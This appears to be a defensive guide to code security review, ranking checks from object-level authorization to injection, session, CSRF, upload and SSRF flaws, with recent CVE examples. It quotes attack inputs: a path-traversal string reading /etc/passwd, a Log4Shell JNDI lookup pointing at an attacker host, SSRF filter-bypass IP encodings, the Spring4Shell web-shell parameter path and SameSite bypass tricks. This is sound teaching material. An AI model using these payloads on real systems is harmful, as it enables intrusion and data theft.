# Security review — finding vulnerabilities in code, by yield

A security review is not a style review with scarier words. It walks the attacker's
paths: start where untrusted input enters, follow it to where it does damage. Ordered
by real-world yield — §2 and §3 find most of what matters.

## 1 · Review where the attacker enters, not where the diff is

Pull the trust boundaries from the threat model (`threat-model.md` §3) and review
boundary-crossing code first: request handlers, file/upload parsers, webhook receivers,
anything deserializing external bytes, anything calling out with user-influenced values.
A diff-only review misses the classic vulnerability shape: an old "internal" function
newly reachable from user input. For each entry point ask one question: **"what is the
worst value an attacker can put here, and what does the code do with it?"** — trace it
all the way, not just past the first validation.

## 2 · Authorization on every object — the highest-yield check

For **every** endpoint/handler that touches a resource by id, verify BOTH:
authenticated (who) AND authorized *for that specific object* (theirs / their role).
This is IDOR — OWASP API1:2023 Broken Object Level Authorization (BOLA), the #1-ranked
API risk and perennially the most common serious finding.

- ❌ `order = db.get(req.params.id)` behind a login check — any logged-in user reads any
  order by iterating ids.
- ✅ `db.get_order(id=req.params.id, owner=current_user.id)` — ownership in the query
  itself, absent → 404.

Two current cases at this exact shape: Grafana CVE-2024-1313 (a user in one org deleted
another org's dashboard snapshot via its non-secret view key — the delete path skipped
an ownership check its sibling operations enforced); the 2025 McDonald's "McHire" breach
(decrementing a numeric `lead_id` returned other applicants' chat transcripts and PII
across ~64M records — the same unguarded-id shape, at breach scale).

Also hunt: state-changing routes missing the authz decorator/middleware that its
siblings have (one forgotten route = the hole); "hidden" admin endpoints relying on the
UI not linking them; authz checked on read but not on the matching write/delete; object
ids accepted in bodies/headers where only the session should decide (see mass
assignment, §5). Prefer unpredictable ids (random UUIDs, not sequential integers) so a
missed check isn't trivially enumerable; write authz tests that block deploy on failure.

Correct object *ownership* doesn't guarantee correct object-*property* scoping (OWASP
API3:2023 BOPLA) — a correctly-owned response can still leak another user's nested data
or internal-only fields.

When you fix an object-authz hole, **pair it with detection**: cross-tenant /
owner-mismatch denials should log and alert on bursts from one account (`operate.md` §3)
— the fix stops the read, the detection catches the attacker still probing.

## 3 · Injection — follow every string that travels

Any user-influenced value that becomes part of *code, a query, a path, a URL, or markup*
is an injection candidate. One discipline covers them all: **data must stay data** —
parameterize/escape at the boundary where the string changes context.

- **SQL:** string-built queries (`f"... WHERE name = '{name}'"`) → parameterized
  queries, no exceptions — including `ORDER BY`/table-name cases (allowlist those).
- **Command:** user input near `exec`/`system`/shell (`subprocess.run(cmd, shell=True)`)
  → argument arrays, no shell; allowlist the executable.
- **Path traversal:** filename/path from the user (`open(base + req.filename)` +
  `../../etc/passwd`) → resolve then verify the result is under the intended root.
- **SSRF:** server fetches a user-supplied URL → allowlist hosts; block private ranges
  and redirects into them (cloud metadata `169.254.169.254` is the classic prize).
  Validate the **IP actually connected to**, not a separate pre-check — resolve once and
  connect to that IP, or validate inside the connection hook; a check-then-fetch by
  hostname is defeated by DNS rebinding. Compare the *parsed* IP, never a regex/prefix
  check on the raw literal — decimal/dword (`2130706433`), octal (`0177.0.0.1`), hex,
  and IPv4-mapped IPv6 (`::ffff:127.0.0.1`) all resolve to 127.0.0.1 and slip past
  string matching. An allowlisted host can itself 301/302 to an internal target — turn
  off auto-redirect-following in the HTTP client and re-validate each `Location` header
  before following it, or cap and re-check every hop. On AWS, IMDSv2 closes only the
  classic EC2 path: hop-limit-1 IMDSv2 still leaks to containers in ECS `awsvpc`/`host`
  network mode (needs `ECS_AWSVPC_BLOCK_IMDS`; only `bridge` mode is covered), and the
  separate container-credentials endpoint (`169.254.170.2` + env-var path) takes no
  token at all; GCP/Azure metadata needs only a header. Block/allowlist all of
  `169.254.0.0/16` at the network layer as the durable control — IMDSv2 is one extra
  EC2-specific layer, not the whole fix.
- **XSS/template:** user content into HTML/JS without context-aware escaping;
  `dangerouslySetInnerHTML`/`innerHTML`/`v-html` with user data; user input inside a
  server-side template *string* (template injection → often RCE — e.g. CVE-2022-22963,
  Spring Cloud Function evaluated the `spring.cloud.function.routing-expression` HTTP
  header directly as a SpEL expression, unauthenticated `Runtime.exec` RCE with no
  template file involved; the sink is any expression/template evaluator reachable from
  a header, config value, or route, not just `.html` files).
- **Deserialization:** `pickle`/`Marshal` on external bytes is RCE by design; Java
  native deserialization is RCE via classpath gadget chains; `yaml.load` with an unsafe
  loader likewise → use `yaml.safe_load`, or JSON / another data-only format for
  external input.
- **Log/format-string lookups:** a third injection mechanism, distinct from templates
  and deserialization above — a library's own `${...}`-style interpolation syntax
  treats logged/formatted string content as active code. Log4Shell (CVE-2021-44228):
  Log4j's message-lookup substitution treated `${jndi:ldap://attacker/a}` inside *any*
  logged string as an instruction to fetch and execute a remote class — no gadget
  chain, no rendered template, just `log.info(userInput)`.

## 4 · Secrets and leakage — what the code reveals

- **Secrets in code/config/history:** API keys, passwords, tokens in source, sample
  configs, or git history (history counts — rotate, don't just delete). → secret
  manager (`operate.md` §2).
- **Logs:** passwords, full tokens, session ids, card numbers, raw PII in log lines —
  logs are the database attackers actually get.
- **Error responses:** stack traces, SQL fragments, internal paths, "user exists but
  wrong password" distinctions → generic errors outward, detail inward.
- **Comparisons on secrets:** token/MAC equality via `==` → constant-time compare.

## 5 · The rest of the high-yield checklist

- **AuthN/session:** password handling not argon2id/bcrypt/scrypt (`design.md` §5);
  tokens that never expire or survive logout/password-change; refresh tokens that don't
  rotate on every use — each redemption should invalidate the one just spent and issue a
  new one (single-use by construction), and a replayed already-spent refresh token is a
  theft signal: revoke the whole token family, not just that token, and force re-auth
  (OAuth 2.1; Auth0/Okta implement this as standard). JWT `alg` accepted from the token
  itself or `none` allowed — the sharper, still-live variant is RS256→HS256 confusion,
  where a verifier that dispatches on the token's own `alg` header can be tricked into
  checking an HS256 signature against the service's own RSA/EC **public** key used as
  the HMAC secret (CVE-2024-54150, `xmidt-org/cjwt`); fix by fixing one expected
  algorithm and key per key id at the verifier — never let the token choose — and
  reject `jku`/`x5u`/`jwk` header hints unless resolved against a locally-trusted
  allowlist. Verify `aud`/`iss` against *this* service's own value on every check —
  signature-valid isn't enough, or a token minted for one tenant is silently accepted by
  another sharing the same signing key. Missing rate-limit on login/OTP (credential
  stuffing); password-reset tokens guessable or long-lived.
- **CSRF:** state-changing endpoints driven by cookie-auth without a CSRF token
  (SameSite=Lax/Strict is worthwhile defense-in-depth, not a substitute — it doesn't
  cover state-changing GETs or attacker-controlled subdomains). Two concrete SameSite
  bypasses: a `_method=POST/PUT/DELETE` override parameter turns a plain cross-site GET
  link (which Lax permits) into the blocked verb; Chrome's "Lax+POST" ~2-minute grace
  window after a cookie is set gives lenient treatment to top-level cross-site POSTs, so
  an attacker who times one just after a fresh top-level navigation (e.g. an OAuth/SSO
  popup) rides that window. CSRF (CWE-352) is trending, not legacy — #4 → #3 in the
  current CWE Top 25.
- **Mass assignment:** request body bound wholesale onto a model — `role`, `is_admin`,
  `price`, or a foreign key like `account_id`/`owner_id`/`tenant_id` (repointing a
  record at another principal is the same IDOR/BOLA class as §2, just reached through a
  body field instead of a URL id) — accepted from the client → explicit field
  allowlists, never a live domain/framework object. The severity ceiling is RCE, not
  just privilege escalation, when the bound object's property graph is walkable by
  reflection: Spring4Shell (CVE-2022-22965) auto-bound arbitrary request parameters by
  reflection, letting attackers set nested paths like
  `class.module.classLoader.resources.context.parent.pipeline.first.pattern` as
  ordinary form fields to write a JSP web shell to disk.
- **File uploads:** type checked by extension/Content-Type only; stored under the web
  root; served with executable/HTML content types → validate magic bytes, store outside
  web root or in object storage, force safe content types. Re-validate at *every* point
  the filename/extension can change, not only initial upload — CVE-2025-34085
  (WordPress Simple File List): the upload path checked extensions correctly, but a
  separate rename operation didn't, so `shell.png` (passes upload check) renamed to
  `shell.php` (never re-checked) got server-side execution.
- **The bytes behind a shared link:** a token/capability that unlocks a resource must
  also gate the file/blob it points to — the download URL needs its own per-request
  authorization (signed short-lived URL or ownership re-check at fetch). Gating the
  metadata endpoint while serving the PDF from a public or guessable storage path
  reintroduces the IDOR at the storage layer (the classic invoice/document-share leak;
  `design.md` §4).
- **Races/TOCTOU:** check-then-act on money or quotas without a transaction/lock —
  redeem-coupon-twice, double-withdrawal (`backend/data.md` transactions).
- **Redirects:** `redirect(req.query.next)` unvalidated → allowlist or same-origin only.
- **Dependencies:** known-CVE versions in the lockfile; install scripts from packages
  nobody vetted (`traps.md` §C).

## 6 · Report honestly — findings, not verdicts

- Every finding: **where** (`file:line`), **what an attacker does** (concrete input →
  concrete damage — if you can't sketch the attack, mark it "needs verification", don't
  inflate), **fix**. Severity = exploitability × impact, not scariness of the name:
  - **High:** reachable pre-auth or by any authenticated user, and yields RCE, another
    user's data, money, or account takeover (the §2 IDOR example is High).
  - **Medium:** needs an unusual position (MITM, an existing privileged account, victim
    interaction) OR impact is limited to one user / minor data.
  - **Low:** needs improbable preconditions, or leaks only internals (stack trace,
    version banner).
  - When exploitability is unverified, report "High if confirmed" + needs-verification —
    don't average the uncertainty into a soft Medium.
- A clean review is reported as **"no issues found in the paths I checked: …"** with the
  paths listed — never "this is secure" (`scope.md` §5). Absence of findings is the
  weakest of evidence, and unchecked paths are the attacker's favorite kind.
